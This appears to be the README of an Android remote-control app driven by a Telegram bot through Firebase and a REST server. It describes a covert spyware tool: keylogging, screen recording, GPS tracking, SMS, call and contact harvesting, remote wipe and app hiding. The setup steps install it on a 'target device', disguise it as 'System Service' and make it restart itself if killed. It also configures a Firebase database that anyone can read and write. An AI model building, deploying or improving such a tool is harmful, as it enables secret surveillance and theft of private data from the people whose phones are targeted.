# Abu-Zahra Admin - Android App

## 📱 Application Overview
Android companion app for the Abu-Zahra Remote Admin Server. Receives and executes commands from the Telegram bot via Firebase Realtime Database + REST API.

## 🏗️ Architecture

```
Server (Python/aiohttp)
    ↓ Firebase RTDB / REST API
Android App (Kotlin)
    ├── Firebase Command Listener (Real-time)
    ├── REST API Poller (Backup, every 15s)
    ├── CommandExecutor → Routes 200+ commands
    │   ├── DataCollector (SMS, Calls, Contacts, Location...)
    │   ├── ControlExecutor (Vibrate, Camera, WiFi, Ring...)
    │   ├── AppExecutor (Open/Close/Install apps)
    │   ├── FileExecutor (List/Delete/Search files)
    │   ├── SecurityExecutor (Lock, Wipe, Hide app)
    │   └── MonitorExecutor (Keylogger, Screen record, GPS tracking)
    └── Results → Firebase + REST API → Server → Telegram
```

## 🔧 Setup Instructions

### 1. Prerequisites
- Android Studio (latest recommended)
- JDK 17+
- A Firebase project with Realtime Database enabled

### 2. Firebase Configuration
1. Go to [Firebase Console](https://console.firebase.google.com/)
2. Create/select project: `studio-7073076148-6afe0`
3. Add Android app with package: `com.abuzahra.admin`
4. Download `google-services.json` and place it in:
   ```
   app/google-services.json
   ```
5. Enable Realtime Database with test mode rules:
   ```json
   {
     "rules": {
       ".read": true,
       ".write": true
     }
   }
   ```

### 3. Build Steps
1. Open the `AbuZahra-Admin` folder in Android Studio
2. Wait for Gradle sync to complete
3. Make sure `app/google-services.json` is in place
4. Update `Config.kt` if your server URL differs:
   ```kotlin
   var SERVER_DOMAIN = "https://alsydyabwalzhra.online"
   var SERVER_PORT = 8443
   ```
5. Build → Build APK(s) → Build APK(s)
6. The APK will be at: `app/build/outputs/apk/debug/app-debug.apk`

### 4. Install & Link
1. Install the APK on target device
2. Open the app
3. Enter the link code from the Telegram bot (`/link`)
4. Grant all permissions when prompted
5. The foreground service will start automatically

## 📁 Project Structure

```
app/src/main/java/com/abuzahra/admin/
├── App.kt                    # Application class
├── Config.kt                 # Server configuration
├── LinkActivity.kt           # Link code entry screen
├── MainActivity.kt           # Device status & settings
├── api/
│   ├── ApiClient.kt          # REST API (OkHttp)
│   └── FirebaseManager.kt    # Firebase Realtime DB
├── executor/
│   ├── CommandExecutor.kt    # Main command router (200+ commands)
│   ├── DataCollector.kt      # SMS, Calls, Contacts, Location, Battery...
│   ├── ControlExecutor.kt    # Vibrate, Ring, Camera, WiFi, Volume...
│   ├── AppExecutor.kt        # Open/Close/Install apps
│   ├── FileExecutor.kt       # File browsing, search, manage
│   ├── SecurityExecutor.kt   # Lock, Wipe, Hide, Device Admin
│   └── MonitorExecutor.kt    # Keylogger, Screen record, GPS tracking
├── model/
│   ├── Command.kt            # Command data model
│   ├── Device.kt             # Device data model
│   └── LinkResult.kt         # Link response model
├── service/
│   ├── CommandService.kt     # Foreground service (core)
│   ├── BootReceiver.kt       # Auto-start on boot
│   ├── SMSReceiver.kt        # SMS monitoring
│   ├── CallReceiver.kt       # Call monitoring
│   └── DeviceAdminReceiver.kt # Device admin features
└── util/
    └── DeviceUtils.kt        # Device ID, preferences, helpers
```

## ⚡ Key Features
- ✅ Firebase Real-time command listener
- ✅ REST API backup polling
- ✅ 200+ command support
- ✅ Foreground service (survives app kill)
- ✅ Auto-start on boot
- ✅ Heartbeat every 60 seconds
- ✅ Location tracking every 5 minutes
- ✅ SMS & Call monitoring
- ✅ Dark theme UI
- ✅ All permissions management

## ⚠️ Notes
- The app icon is named "System Service" to be discreet
- Foreground service shows minimal notification
- App restarts itself if killed (when linked)
- Requires Firebase `google-services.json` to build
